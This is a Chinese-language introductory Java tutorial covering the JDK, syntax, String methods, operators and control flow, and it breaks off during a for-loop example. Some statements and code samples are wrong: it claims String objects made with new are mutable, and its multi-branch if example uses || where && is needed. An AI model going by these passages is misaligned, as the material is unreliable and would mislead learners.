#  Java基础教学

![image-20240912090346974](https://image.201068.xyz/assets/32.JAVA/image-20240912090346974.png)

## 第⼀节 Java简介

### ⼀、Java背景知识

Java是美国Sun（Stanford University Network，斯坦福⼤学⽹络公司）公司在1995年推出的⼀⻔计算机⾼级编程语⾔。

但是在2009年是Sun公司被Oracle（甲⻣⽂）公司给收购了，所以⽬前Java语⾔是Oracle公司⾃有产品。

早期这⻔语⾔的名字其实不叫Java，当时称为Oak（橡树的意思），为什么叫橡树呢？原因是因为Sun公司的⻔⼝种了很多橡树，但是后来由于商标注册时，Oak商标已经其他公司注册了，所以后⾯改名为Java了。

那么有⼈好奇为什么叫Java呢？Java是印度的⼀个岛屿，上⾯盛产咖啡，可能是因为他们公司的程序员喜欢喝咖啡，所以就改名为Java了。

Java的联合创始⼈有很多，但是⾏业普遍认可的Java的创始⼈是 `詹姆斯●⾼斯林` ，被称为Java之⽗。

### ⼆、Java能⼲什么

![image-20240912090529756](https://image.201068.xyz/assets/32.JAVA/image-20240912090529756.png)

其实Java能做的事情⾮常多，它可以做桌⾯应⽤的开发、企业互联⽹应⽤开发、移动应⽤开发、服务器系统开发、⼤数据开发、游戏开发等等。

- 桌⾯应⽤开发：能够在电脑桌⾯运⾏的软件
  - 举例：财务管理软件、编写程序⽤的IDEA开发⼯具等，可以⽤Java语⾔开发
- 企业级应⽤开发：⼤型的互联⽹应⽤程序
  - 举例：淘宝、京东、腾讯等这些⼤型应⽤中台
- 移动应⽤开发：运⾏的Android⼿机端的软件
  - 举例：QQ客户端、抖⾳APP等
- 服务器系统：应⽤程序的后台（为客户端程序提供数据）
  - 举例：web应⽤的后台
- ⼤数据开发：⼤数据是⼀个互联⽹开发⽅向
  - 举例：⽬前最⽕的⼤数据平台是Hadoop，就是⽤Java语⾔开发的
- 游戏开发：游戏本质上是给⽤户提供娱乐的软件，有良好的交互感受
  - 举例：我的世界、2048、魔兽世界就是⽤Java语⾔开发的

### 三、java的技术体系

所谓技术体系，就是Java为了满⾜不同的应⽤场景提供了不同的技术版本，主要有三个版本。

- Java SE（Java Standard Edition）：叫做标准版，它是后⾯两个版本的基础，也就是学习后⾯两个版本必须先学习JavaSE。
- Java EE（Java Enterprise Edition）: 叫做企业版，它是为企业级应⽤开发提供的⼀套解决⽅案。
- Java ME（Java Micro Edition）：叫做⼩型版，它为开发移动设备的应⽤提供了⼀套解决⽅案。⽬前已经不被市场认可（淘汰），取⽽代之的是基于Android系统的应⽤开发

### 四、JDK介绍

#### 1.JDK发展史

要想编写java程序，就要先安装java的开发环境，才能使⽤java语⾔开发程序。

这⾥所说的java开发环境，实际上就是java官⽅提供的⼀个软件，叫做jdk（全称是java develop kit），翻译过来意思就是Java开发⼯具包。我们先要到官⽹上去下载JDK，然后安装在⾃⼰的电脑上，才可以在⾃⼰的电脑上使⽤JDK来开发Java程序。

JDK的版本有很多，下图是JDK版本更新的历程图，有LTS标识的是⻓期⽀持版本（意思就是Oracle会不定期更新）。

⽬前公司中⽤得最多的版本是JDK8版本，在本课程中我们会使⽤JDK17版本。

![image-20240912090753063](https://image.201068.xyz/assets/32.JAVA/image-20240912090753063.png)

#### 2.JDK的组成

JDK由JVM、核⼼类库、开发⼯具组成，如下图所示：

![image-20240912090812490](https://image.201068.xyz/assets/32.JAVA/image-20240912090812490.png)

> 1.什么是JVM?
>
> 答：JDK最核⼼的组成部分是JVM（Java Virtual Machine），它是Java虚拟机，真正运⾏Java程序的地⽅。
>
> 2.什么是核⼼类库？
>
> 答：它是Java本身写好的⼀些程序，给程序员调⽤的。 Java程序员并不是凭空开始写代码，是要基于核⼼类库提供的⼀些基础代码，进⾏编程。
>
> 3.什么是JRE?
>
> 答：JRE（Java Runtime Enviroment），意思是Java的运⾏环境；它是由JVM和核⼼类库组成的；如果你不是开发⼈员，只需要在电脑上安装JRE就可以运⾏Java程序。
>
> 4.什么是开发⼯具呢？
>
> 答：Java程序员写好源代码之后，需要编译成字节码，这⾥会提供⼀个编译⼯具叫做javac.exe，编写好源代码之后，想要把class⽂件加载到内存中运⾏，这⾥需要⽤到运⾏⼯具java.exe。除了编译⼯具和运⾏⼯具，还有⼀些其他的反编译⼯具、⽂档⼯具等等...

JDK、JRE的关系⽤⼀句话总结就是：⽤JDK开发程序，交给JRE运⾏。

#### 3.JDK环境变量配置

https://www.oracle.com/cn/java/technologies/downloads/#jdk17-windows

![image-20240912092135920](https://image.201068.xyz/assets/32.JAVA/image-20240912092135920.png)

JDK安装后，要配置PATH环境变量。

##### 1.什么是Path环境变量？

Path环境变量是让系统程序的路径，⽅便程序员在命令⾏窗⼝的任意⽬录下启动程序；

##### 2.将JDK配置到PATH路径下

我们把JDK的bin⽬录配置到Path环境变量下，这样就可以在任意⽬录下启动javac和java命令来完成编译和运⾏了。

- 第⼀步：找到JDK的bin⽬录`C:\Program Files\Java\jdk-17.0.12\bin`，复制⼀下。

- 第⼆步：将JDK的bin⽬录粘贴在Path环境变量后⾯。

- 第三步：检测是否配置成功

  1. 按住`Win+R`输⼊`cmd` 回⻋，打开命令⾏创建
  2. 输⼊`javac -version` 看提示信息是否显示你安装JDK的版本号【如果显示版本号都是JDK17就表示配置安装成功】

### 五、Java的跨平台原理

我们知道Java程序的执⾏是依赖于Java虚拟机的。就是因为有了Java虚拟机所以Java程序有⼀个重要的特性叫做跨平台性。

#### 1.什么是跨平台性呢？

- 所谓跨平台指的是⽤Java语⾔开发的程序可以在多种操作系统上运⾏，常⻅的操作系统有Windows、Linux、MacOS系统。
- 如果没有跨平台性，同⼀个应⽤程序，想要在多种操作系统上运⾏，需要针对各个操作系统单独开发应⽤。⽐如微信有Windows版本、MacOS版本、Android版本、IOS版本

#### 2.为什么Java程序可以跨平台呢？

- 跨平台性的原理是因为在不同版本的操作系统中安装有不同版本的Java虚拟机，Java程序的运⾏只依赖于Java虚拟机，和操作系统并没有直接关系。从⽽做到⼀处编译，处处运⾏。

![image-20240912091055736](https://image.201068.xyz/assets/32.JAVA/image-20240912091055736.png)

### 六、Java程序编译过程

![image-20240912091119282](https://image.201068.xyz/assets/32.JAVA/image-20240912091119282.png)

我们编译的源代码（xxx.java）经JDK中的javac命令编译后，成为JVM能够理解的Java字节码（xxx.class），然后由JVM加载，通过解释器逐⾏解释执⾏，这就是为什么能经常听说Java是⼀⻔编译和解释共存的语⾔。

其中JVM是解释Java字节码（xxx.class）的虚拟机，针对不同系统均有特定实现，⽅便⼀次编译，多次运⾏，即Java语⾔的跨平台特性。

### 七、Java开发⼯具

常⻅的Java开发⼯具有Eclipse、MyEclipse、Intellij IDEA、JBuilder、NetBeans等，这些统称为集成开发环境（Integrated Development Environment，简称IDE）。

这些IDE中⽬前⽐较⽕的是Intellij IDEA（以下简称IDEA），被众多Java程序员视为最好⽤的Java集成开发环境，尤其在智能代码助⼿、代码⾃动提示、重构、J2EE⽀持、JUnit、CVS整合、代码审查、创新的GUI设计等⽅⾯的功能可以说是超常的，所以我们教学中就以IDEA为开发⼯具来编写代码。相关IDEA软件安装步骤同PyCharm⼀样，请⾃⾏安装。

### ⼋、⼯程结构

想要在IDEA正确的写⼀个Java程序，必须先认识⼀下IDEA的管理Java程序的⼯程结构。

- 第⼀步：⾸先得在IDEA中创建⼀个Project（⼯程、也叫项⽬），后⾯统称为⼯程；
- 第⼆步：需要在Project中创建Module（模块），⼀个⼯程中可以包含多个模块；
- 第三步：需要在Module中新建Package（包），⼀个模块中可以有多个包；
- 第四步：需要在Package中新建Class（类），⼀个包中可以包含多个类；

软件⼯程其实类似于建筑⼯程，我们对⽐建筑⼯程来理解。

- Project（⼯程）：你可以理解成⼩区的院⼦；
- Module（模块）：你可以理解成⼩区院⼦⾥⾯的每⼀栋楼；
- Package（包）：你可以理解成每⼀栋楼的⼀层；
- Class（类）：你可以理解成每⼀层的住户；

在实际开发中⽐如淘宝⽹站这样的⼯程，但是由于功能很多，所以就把淘宝⽹站分为不同的模块，⾸⻚是⼀个模块、购物⻋是⼀个模块、订单也是⼀个模块等等，由各个模块组成⼀个完整的项⽬⼯程。

### 九、创建⼯程Project

打开IDEA，选择New Project，

https://www.jetbrains.com/zh-cn/idea/

![image-20240912103200889](https://image.201068.xyz/assets/32.JAVA/image-20240912103200889.png)

## 第⼆节 Java基础语法

想要编写Java代码，就必须学习Java语法，学习语法最主要做到下⾯两点就可以了。

记住语法格式

明确这种语法格式能达到什么效果

语法格式是Java语⾔的设计者规定好的，我们不⽤关⼼它为什么这么写，因为它造出来就是这么写的。

### ⼀、注释

> 什么是注释？
>
> 注释是解释说明程序代码的意义，⽅便⾃⼰和别⼈阅读代码

#### 单⾏注释

```java
// 解释⽂字
```

#### 多⾏注释

```java
/*
这⾥是注释
可以写多⾏
*/
```

#### ⽂档注释

```java
/**
这⾥写⽂档注释
也可以写多⾏，
⽂档注释可以利⽤JDK⼯具⽣成帮助⽂档
*/
```

#### 下⾯⽤注释解释⼀段代码

```java
/
* 注释的⽤法
* */
public class NoteDemo {
// 程序的主⽅法，是程序的⼊⼝
public static void main(String[] args) {
System.out.println("Hello world");
/*
* 这是⼀句打印Hello world的代码
* */
 }
}
```

### ⼆、标识符

⽤来标记类名、对象名、变量名、⽅法名、类型名、数组名、⽂件名的有效字符序列。

#### 合法的标识符：

- 由字⺟、数字、下划线“_”、美元符号“$”或者“￥”组成，并且⾸字符不能是数字。
- 不能把java关键字和保留字作为标识符。
- 标识符对⼤⼩写敏感。

#### 建议遵守：

按照下⾯的⽅式取名字会显得更加专业

- 所有的名字要⻅名知意，便于⾃⼰和别⼈阅读
- 类名⾸字⺟⼤写（⼤驼峰命名）
- 变量名第⼆个单词开始⾸字⺟⼤写（⼩驼峰命名）

### 三、关键字

Java语⾔中已经赋予了特定含义的单词，⽐如⽤int表示整数，⽤double表示⼩数等等。

![image-20240912091535822](https://image.201068.xyz/assets/32.JAVA/image-20240912091535822.png)

关键字特点：

- 关键字都是⼩写的；
- 关键字在IDEA中有特殊颜⾊标记，如果没有修改关键字的演示，默认是蓝⾊的；

### 四、变量

变量是⽤来记录程序中的数据的，其本质上是内存中的⼀块区域，可以把这块区域理解成⼀个⼩盒⼦。

![image-20240912091615682](https://image.201068.xyz/assets/32.JAVA/image-20240912091615682.png)

定义变量的格式：

![image-20240912091631415](https://image.201068.xyz/assets/32.JAVA/image-20240912091631415.png)

当执⾏int age = 18; 这句代码时，JVM会在内存中申请⼀块区域，在这个区域中存储了⼀个整数18，给这个区域取的名字叫age； 

相当于在盒⼦中存了⼀个数据18，这个盒⼦的名字是age，当我们打印age时，就是从盒⼦中把盒⼦中的数据取出来再打印。

```java
int a = 10;
System.out.printf("a变量的值是 %d \n", a);

String b = "Hello world";
System.out.printf("b变量的值是 %s\n", b);;
```

定义变量注意事项：

1.变量定义在哪个代码{}范围内，就只能在哪个代码块内⽣效。变量的有效范围称之为变量的作⽤域

```java
{
 int a = 10;
 System.out.println(a);
}
```

2.在同⼀个作⽤域内，不能重复定义两个同名的变量，只能重新赋值

```java
{
 int a = 10;
 int a = 20; // 这⾥会出错
}
```

3.变量没有初始化，不能直接使⽤

```java
{
 int a; // 只定义，没有初始化赋值
 System.out.println(a)
}
```

4.变量可以定义在同⼀⾏

```java
int a = 10, b = 20; // a和b都是int类型
```

### 五、数据类型

![image-20240912094256676](https://image.201068.xyz/assets/32.JAVA/image-20240912094256676.png)

基本数据类型（8个），也称原始数据类型：

![image-20240912101452263](https://image.201068.xyz/assets/32.JAVA/image-20240912101452263.png)

> 注意：
>
> 1.String字符串不属于8种基本类型其中的⼀个！String是⼀个类对象，String实例的值是通过字符数组实现字符串存储的。
>
> 2.boolean ⼀般⽤ 1 bit 来存储，但是具体⼤⼩并未规定，JVM 在编译期将 boolean 类型转换为 int，此时 1 代表 true，0 代表 false。此外，JVM 还指出 boolean 数组，但底层是通过 byte 数组来实现;
>
> 3.使⽤ long 类型时，需要在后边加上 L，否则将其作为整型解析，可能会导致越界；
>
> 4.浮点数如果没有明确指定 float 还是 double，统⼀按 double 处理；
>
> 5.char 是⽤ 单引号 ‘’ 将内容括起来，相当于⼀个整型值（ASCII 值），能够参加表达式运算；⽽ String 是⽤双引号 “” 将内容括起来，代表的是⼀个地址值；

### 六、字符串String

#### 1.字符串特点

String类是Java中提供的⼀个核⼼类，⽤于表示字符串的不可变序列。它属于Java标准库的⼀部分，定义在java.lang包中，并且是⼀个final类，即不可被继承。下⾯详细介绍String类的定义和特点：

- 定义： String类是⼀个引⽤类型（Reference Type），它⽤于表示由字符组成的字符串。在Java中，字符串被视为⼀个对象⽽不是基本数据类型。每个String对象实例都包含⼀个字符序列，该序列具有固定的⻓度和内容。
- 不可变性： String对象是不可变的，即⼀旦创建，其值就不能被改变。这意味着String对象的内容在创建后不可更改。对于任何对String对象的操作，都会返回⼀个新的String对象，原始对象保持不变。这种不可变性使得String对象具有线程安全性和内存安全性。
- 字符串常量池： Java中的字符串常量池（String Pool）是⼀种特殊的内存区域，⽤于存储字符串常量。通过字符串字⾯量创建的String对象会⾸先在字符串常量池中进⾏查找，如果存在相同值的字符串，则直接返回常量池中对应的引⽤。这种机制可以节约内存空间，提⾼字符串的重⽤性。
- ⽅法和操作： String类提供了丰富的⽅法和操作，⽤于处理字符串。常⽤的操作包括字符串连接、⼦串提取、字符查找、替换和⽐较等。String类还提供了对字符串⻓度、⼤⼩写转换、字符编码转换等常⽤操作的⽀持。

- 其他特点：

  - String对象是不可变的，因此在多线程环境中可以被安全地共享。

  - String类实现了Comparable接⼝，因此可以进⾏字符串的⽐较和排序操作。

  - String类在Java中⼴泛应⽤于各种场景，如⽂件处理、⽹络通信、数据库操作等。

#### 2.创建字符串的⽅式

##### (1)使⽤字符串字⾯量创建

这是最常⻅和简单的创建String对象的⽅式。通过将字符串⽂字放在引号中，Java编译器会⾃动将其转换为String对象。例如：

```java
String str = "Hello world";
```

使⽤字符串字⾯量创建的String对象会⾸先在字符串常量池中查找是否存在相同值的字符串，

如果存在，则返回常量池中的引⽤；

如果不存在，则会创建⼀个新的String对象，并将其添加到**字符串常量池**中。

##### (2)使⽤new关键字创建

通过使⽤new关键字和String类的构造⽅法，可以显式地创建⼀个新的String对象。例如：

```java
String str = new String("Hello")
```

当使⽤这种⽅式创建String对象时，⽆论字符串常量池中是否已经存在相同值的字符串，都会创建⼀个新的String对象。

因此，使⽤new关键字创建的String对象不会使⽤字符串常量池。

##### (3)使⽤字符数组创建

还可以使⽤字符数组来创建String对象。可以通过传递字符数组作为参数给String类的构造⽅法，来创建⼀个包含字符数组内容的String对象。例如：

```java
char[] chars = {'H', 'e', 'l', 'l', 'o'};
String str = new String(chars);
```

可以传递整个字符数组或者数组的⼦集来创建String对象。

##### (4)使⽤字符串拼接

使⽤字符串拼接运算符（`+`）可以将多个字符串拼接在⼀起，并创建⼀个新的String对象。例如：

```java
String str = "Hello" + "," + "world";
```

需要注意的是，使⽤字符串字⾯量创建的String对象会⾃动加⼊字符串常量池，⽽通过new关键字创建的String对象不会加⼊字符串常量池。

此外，字符串常量池中的字符串对象在运⾏时是不可变的，⽽使⽤new关键字创建的String对象可以进⾏修改。

#### 3.字符串的⽐较

在Java中，字符串的⽐较是常⻅且重要的操作，⽤于判断两个字符串是否相等或者确定它们的顺序。

Java提供了多种⽅法来⽐较字符串：

##### (1)使⽤equals()⽅法

equals()⽅法⽤于判断两个字符串的**内容是否相同**。例如：

```java
String str1 = "Hello";
String str2 = "hello";
boolean isEqual = str1.equals(str2);
System.out.println(isEqual);

// 执⾏结果
false
```

##### (2)使⽤equalsIgnoreCase()⽅法

equalsIgnoreCase()⽅法⽤于**忽略字符串的⼤⼩写**，判断两个字符串的**内容是否相同**。例如：

```java
String str1 = "Hello";
String str2 = "hello";
boolean isEqual = str1.equalsIgnoreCase(str2);
System.out.println(isEqual);

// 执⾏结果
true
```

在这个例⼦中，str1.equalsIgnoreCase(str2)将返回true，因为它忽略了⼤⼩写。

##### (3)使⽤compareTo()⽅法

`compareTo()`⽅法⽤于按照**字典顺序**⽐较字符串。

它返回⼀个整数，表示两个字符串之间的关系。具体规则如下：

- 如果字符串**相等**，返回0。
- 如果当前字符串**⼩于**参数字符串，返回⼀个**负数**。
- 如果当前字符串**⼤于**参数字符串，返回⼀个**正数**。

```java
String str3 = "apple";
String str4 = "banana";
int res = str3.compareTo(str4);
System.out.println(res);

// 执⾏结果
-1
```

在上述例⼦中，str1.compareTo(str2)将返回⼀个负数，表示str1在字典顺序中位于str2之前。

##### (4)使⽤compareToIgnoreCase()⽅法

 compareToIgnoreCase()⽅法与compareTo()⽅法类似，但忽**略字符串的⼤⼩写**。例如：

```java
String str3 = "apple";
String str4 = "banana";
int res = str3.compareToIgnoreCase(str4);
System.out.println(res);

// 执⾏结果
-1
```

在这个例⼦中，`str1.compareToIgnoreCase(str2)`将返回⼀个负数，表示str1在字典顺序中位于str2之前（忽略⼤⼩写）。

需要注意的是，字符串的⽐较⽅法都是基于Unicode值进⾏的。

此外，可以使⽤==运算符⽐较两个字符串的引⽤是否相等，但它不⽐较字符串的内容，仅判断两个字符串对象是否指向同⼀块内存地址。

#### 4.字符串的提取和截取

在Java中，可以使⽤不同的⽅法对字符串进⾏提取和截取操作。这些操作允许你从原始字符串中选择特定部分并创

建新的字符串。需要注意的是，字符串的提取和截取操作都会⽣成⼀个新的字符串对象。

##### (1)使⽤substring()⽅法

substring()⽅法⽤于从原始字符串中提取⼦字符串。它接受⼀个或两个参数，第⼀个参数指定⼦字符串的起始索引（包括），第⼆个参数（可选）指定⼦字符串的结束索引（不包括）。例如：

```java
String str = "Hello world";
String substr = str.substring(4);
System.out.println(substr);

// 执⾏结果
o world
```

在上述例⼦中，str的值为"World"，⽽substr的值为"o world"。

##### (2)使⽤split()⽅法

`split()`⽅法⽤于将字符串按照指定的分隔符切分成多个⼦字符串，并返回⼀个字符串数组。例如：

```java
String str1 = "冬没有春的繁华,没有夏的张扬,没有秋的丰硕,⽽她所独有的就是那份圣洁,刚毅,⽆私的品质";
String[] str2 = str1.split(",");
    for (int i = 0; i < str2.length; i++){
        System.out.println(str2[i]);
}

// 输出结果
冬没有春的繁华
没有夏的张扬
没有秋的丰硕
⽽她所独有的就是那份圣洁
刚毅
⽆私的品质
```

##### (3)使⽤charAt()⽅法

 `charAt()`⽅法⽤于返回字符串中指定索引位置的字符。索引**从0开始**。例如：

```JAVA
String str3 = "Today is nice day";
char ch = str3.charAt(6);
System.out.println(ch);

// 执⾏结果
i
```

#### 5.字符串的查找和替换

在Java中，可以使⽤不同的⽅法来进⾏字符串的查找和替换操作。这些操作使您能够在字符串中查找特定的字符或⼦字符串，并将其替换为新的字符或字符串。需要注意的是，字符串的查找和替换操作都会⽣成⼀个新的字符串对象，原始字符串本身不会受到改变。

##### (1)使⽤indexOf()⽅法

`indexOf()`⽅法⽤于查找指定字符或⼦字符串在原始字符串中**第⼀次出现的位置索引**。

如果找到匹配，返回第⼀个匹配的索引；

如果没有找到匹配，返回-1。例如：

```JAVA
String str4 = "hello world";
int index = str4.indexOf("o");
System.out.println(index);

// 执⾏结果
4
```

##### (2)使⽤lastIndexOf()⽅法

`lastIndexOf()`⽅法与indexOf()⽅法类似，但是它从字符串的**末尾开始查找**指定字符或⼦字符串**最后⼀次出现的位置**索引。例如

```JAVA
String str4 = "hello world";
int index = str4.lastIndexOf("o");
System.out.println(index);

// 执⾏结果
7
```

##### (3)使⽤contains()⽅法

`contains()`⽅法⽤于检查字符串中**是否包含指定的字符或⼦字符串**。**返回值为布尔类型**。例如：

```JAVA
String str5 = "Hello world";
boolean flag = str5.contains("world");
System.out.println(flag);

// 执⾏结果
true
```

##### (4)使⽤replace()⽅法

`replace()`⽅法⽤于将指定字符或⼦字符串替换为新的字符或字符串。例如：

```JAVA
String str6 = "Hello world";
String str7 = str6.replace("o", "0");
System.out.println(str7);

// 执⾏结果
Hell0 w0rld
```

### 七、数据类型转换

数据类型转换必须满⾜如下规则：

- 不能对boolean类型进⾏类型转换。
- 不能把对象类型转换成不相关类的对象。
- 在把容量⼤的类型转换为容量⼩的类型时必须使⽤强制类型转换。
- 转换过程中可能导致溢出或损失精度，例如：

```JAVA
int i =128; 
byte b = (byte)i;
```

因为 `byte` 类型是 `8` 位，最⼤值为`127`，所以当 int 强制转换为 byte 类型时，值 128 时候就会导致溢出。

- 浮点数到整数的转换是通过舍弃⼩数得到，⽽不是四舍五⼊，例如：

```JAVA
(int)23.7 == 23; 
(int)-45.89f == -45
```

#### 1.⾃动转换 

⼜称为隐式转换⼩范围-->⼤范围

```JAVA
byte,short,char—> int —> long—> float —> double
```

示例：

```JAVA
int c = 10;
double d = c;
System.out.printf("d的值是 %f", d);

// 执⾏结果
d的值是 10.000000
```

#### 2.强制转换

⼜称显式转换，⼤范围-->⼩范围

```JAVA
double e = 11.11;
int f = (int) e;
System.out.printf("f的值是 %d", f);

// 执⾏结果
f的值是 11
```

### ⼋、运算符

运算符是⼀种特殊符号，⽤以表示数据的运算、赋值和数与数的⽐较。

运算符分为：算术运算符、赋值运算符、⽐较运算符、逻辑运算符、三元运算符。

#### 1.算术运算符

| 运算符 | 运算       | 范例              | 结果           |
| ------ | ---------- | ----------------- | -------------- |
| +      | 加         | `5+5`             | 10             |
| -      | 减         | `6-4`             | 2              |
| *      | 乘         | `3*4`             | 12             |
| /      | 除         | `5/5`             | 1              |
| %      | 取模       | `10%5`            | 0              |
| ++     | 自增（前） | `a=2; b=++a;`     | `a=3; b=3;`    |
| ++     | 自增（后） | `a=2; b=a++;`     | `a=3; b=2;`    |
| --     | 自减（前） | `a=2; b=--a;`     | `a=1; b=1;`    |
| --     | 自减（后） | `a=2; b=a--;`     | `a=1; b=2;`    |
| +      | 字符串相加 | `"Hello"+"world"` | `"Helloworld"` |

##### 加法+

```java
int a = 10, b = 20;
System.out.println(a + b); // 10 + 20 = 30
// 如果⼀个数字加⼀个字符串,则会进⾏拼接
int c = 123;
String d = "hello";
System.out.println(c + d); // 123 + hello = 123hello
```

##### 减法-

```java
int a = 20, b = 10;
System.out.println(a - b); // 20 - 10 = 10
```

##### 乘法*

```java
int a = 2, b = 5;
System.out.println(a * b); // 2 * 5 = 10
```

##### 除法/

```java
int a = 10;
int b = 2;
System.out.println(a / b); // 5

int c = 5;
int d = 2;
System.out.println(c / d); // 2
```

##### 取模%

```java
int a = 5;
int b = 2;
System.out.println(a % b); // 1

int c = 6;
int d = 2;
System.out.println(c % d); // 0
```

##### 递增++

```java
// 第⼀种先减在赋值
int a = 1;
System.out.println(--a); // 0;

// 第⼆种先赋值在减
int b = 1;
System.out.println(b--); // 1
```

#### 2.赋值运算符

| 运算符 | 运算   | 范例              | 结果        |
| ------ | ------ | ----------------- | ----------- |
| =      | 赋值   | `a=3; b=2;`       | `a=3; b=2;` |
| +=     | 加等于 | `a=3; b=2; a+=b;` | `a=5; b=2;` |
| -=     | 减等于 | `a=3; b=2; a-=b;` | `a=1; b=2;` |
| *=     | 乘等于 | `a=3; b=2; a*=b;` | `a=6; b=2;` |
| /=     | 除等于 | `a=3; b=2; a/=b;` | `a=1; b=2;` |
| %=     | 模等于 | `a=3; b=2; a%=b;` | `a=1; b=2;` |

##### 赋值=

```java
// 给 a 和 b 同时赋值
int a = 10, b = 20;
System.out.println("a: " + a + ", b: " + b); // a: 10, b: 20
// 字符串类型也可以进⾏ 加法赋值
String a = "hello", b = " world";
a += b;
System.out.println(a); // hello world
```

##### 加法赋值+=

```java
// 将第⼀个数字加与第⼆个数字
int a = 10, b = 20;
a+=b;
System.out.println(a); // 30
```

##### 减法赋值-=

```java
// 将第⼀个数字减与第⼆个数字
int a = 10, b = 20;
a-=b;
System.out.println(a); // -10
```

##### 乘法赋值*=

```java
// 将第⼀个数字乘与第⼆个数字
int a = 10, b = 20;
a*=b;
System.out.println(a); // 200
```

##### 除法赋值/=

```java
// 将第⼀个数字除与第⼆个数字
int a = 100, b = 20;
a/=b;
System.out.println(a); // 5
```

##### 取模赋值%=

```java
// 将第⼀个数字模与第⼆个数字
int a = 5, b = 2;
a%=b;
System.out.println(a); // 1
```

#### 3.⽐较运算符

| 运算符 | 运算       | 范例     | 结果  |
| ------ | ---------- | -------- | ----- |
| >      | 大于号     | `2 > 3`  | false |
| >=     | 大于等于号 | `2 >= 3` | false |
| <      | 小于号     | `2 < 3`  | true  |
| <=     | 小于等于号 | `2 <= 3` | true  |
| ==     | 等等于     | `2 == 3` | false |
| !=     | 不等于     | `2 != 3` | true  |

⽐较运算符返回的结果是⼀个Boolean值，true或false。

##### 等等于==

```java
// ⽐较两个数是否相等
int a = 5, b = 2;
System.out.println(a==b); // false

// ⽐较两个字符串是否相等
String a = "hello", b = "hello";
System.out.println(a==b); // true
```

##### 不等于!=

```java
// ⽐较第⼀个数是否不等于第⼆个数
int a = 5, b = 2;
System.out.println(a!=b); // true

// ⽐较第⼀个字符串是否不等于第⼆个字符串
String a = "hello", b = "hello";
System.out.println(a!=b); // false
```

##### ⼤于>

```java
// ⽐较第⼀个数是否⼤于第⼆个数
int a = 5, b = 2;
System.out.println(a>b); // true
```

##### ⼩于<

```java
// ⽐较第⼀个数是否⼩于第⼆个数
int a = 5, b = 2;
System.out.println(a<b); // false
```

##### ⼤于等于>=

```java
// ⽐较第⼀个数是否⼤于或者等于第⼆个数
int a = 5, b = 2;
System.out.println(a>=b); // true
```

##### ⼩于等于<=

```java
// ⽐较第⼀个数是否⼩于或者等于第⼆个数
int a = 5, b = 2;
System.out.println(a<=b); // false
```

#### 4.逻辑运算符

| 运算符 | 运算 | 范例            | 结果  |
| ------ | ---- | --------------- | ----- |
| !      | 非   | `!true`         | false |
| &&     | 与   | `true && false` | false |
| \|\|   | 或   | `true || false` | true  |

逻辑运算的前提是需要两个表达式，返回的是Boolean值。

##### 与&&

两个表达式同时为true时返回true，否则返回false

```java
// 判断a 等于 b 与 c 等于 d
int a = 5, b = 2;
int c = 10, d = 10;
System.out.println(a == b && c == d); // false
```

##### 或||

有⼀个表达式为true时返回true，两个表达式都为false时返回false

```java
int a = 5, b = 2;
int c = 10, d = 10;
System.out.println(a == b || c == d); // true
```

##### ⾮!

```java
// 取反
boolean b = true;
System.out.println(!b); // false
// 结合表达式使⽤
int a = 10, b = 10;
System.out.println(!(a == b)); // false
```

#### 5.三元运算符

根据条件选择不同类型的值，形式为：`条件 ? 值1 : 值2`

```java
int a = 10, b = 5;
String result = a > b ? "a ⼤于 b":"a ⼩于 b";
System.out.println(result); // a ⼤于 b
```

## 第三节 Java流程控制

### ⼀、选择结构if语句

语句格式：

```java
if (条件表达式){⼀条或多条语句};
//或
if(条件表达式) {语句块1} else {语句块2};
```

![image-20240912150432418](https://image.201068.xyz/assets/32.JAVA/image-20240912150432418.png)

`if-else`语句是Java中⽤于根据条件执⾏代码的⼀种结构。

它由⼀个条件、⼀个`then`⼦句和⼀个`else`⼦句组成。

条件是⼀个布尔表达式，它可以是true或false。如果条件为true，则执⾏then⼦句。

如果条件为false，则执⾏else⼦句。

#### 1.if单独使⽤                                                                                                

```java
/* 第⼀种 if 单独使⽤
   if(条件){
   条件满⾜执⾏
    }
*/
if (i > 100) {
    System.out.println("i ⼤于 100 时执⾏");
}
```

#### 2.if-else结合使⽤                                                                                                 

```java
  /* 第⼆种 if else 结合使⽤
   if(条件){
      条件满⾜执⾏
   }else{
      条件不满⾜执⾏
   }
   */
if (i > 100) {
    System.out.println("i ⼤于 100 时执⾏");
} else {
    System.out.println("i ⼩于 100 时执⾏");
}
```

#### 3.多重if-else                                                                                                   

```java
/* 第三种 多重if
  if(条件1){
      满⾜条件1执⾏
  } else if(条件2){
      满⾜条件2执⾏
  } else if(条件3){
      满⾜条件3执⾏
  }else{
      都不满⾜执⾏
  }
*/
if (i > 100) {
    System.out.println("i ⼤于 100 时执⾏");
} else if (i > 80 || i <= 100) {
    System.out.println("i 在 80-100 之间执⾏");
} else if (i > 70 || i <= 80) {
    System.out.println("i 在 70-80 之间执⾏");
} else {
    System.out.println("i ⼩于 70 执⾏");
}
```

#### 4.嵌套if-else                                                                                                   

```java
  /* 第四种 嵌套if
  if(条件1){
      if(条件2){
          满⾜条件1，满⾜条件2执⾏
      }else{
         满⾜条件1，不满⾜条件2执⾏
      }
  } else {
      if(条件3){
          不满⾜条件1，满⾜条件3执⾏
      }else{
          不满⾜条件1，不满⾜条件3执⾏
      }
  }
   */
if(i > 100){
    if(i > 120){
        System.out.println("i ⼤于 120 执⾏");
    }else{
        System.out.println("i ⼤于 100 ⼩于 120 执⾏");
    }
}else {
    if(i > 80){
        System.out.println("i ⼩于 100 ⼤于 80 执⾏");
    }else{
        System.out.println("i ⼩于 80 执⾏");
    }
}
```

### ⼆、switch开关语句                                                                                                  

switch 语句是根据⼀个表达式的值执⾏不同的代码块的⼀种结构。switch 语句由⼀个关键字 switch、⼀个表达式和⼀个或多个 case 语句组成。表达式必须是⼀个整数、字符或字符串。case 语句由⼀个关键字 case 和⼀个常量组成。每个 case 语句后⾯跟着⼀个冒号，然后是该 case 语句要执⾏的代码块。

```java
public class SwitchDemo {
     public static void main(String[] args){
        int i = 1;
        String str;
        switch (i) {
            case 1:
                str = "星期⼀";
                break;
            case 2:
                str = "星期⼆";
                break;
            case 3:
                str = "星期三";
                break;
            case 4:
                str = "星期四";
                break;
           case 5:
                str = "星期五";
                break;
            default:
                str = "星期日";
                break;
        }
      System.out.println("今天是：" + str);
  }
}
```

### 三、循环结构                                                                                                   

在程序中当要重复性的做某项⼯作时可以使⽤循环语句，包括：for循环、while循环、do…while循环。

#### 1.for循环语句                                                                                                     

```java
语句结构：
  for(变量初始化; 循环条件;  迭代语句){
       循环体
  }
```

##### 举例:九九乘法表

```java
  public class ForDemo {
      public static void main(String[] args) {
          //99乘法表
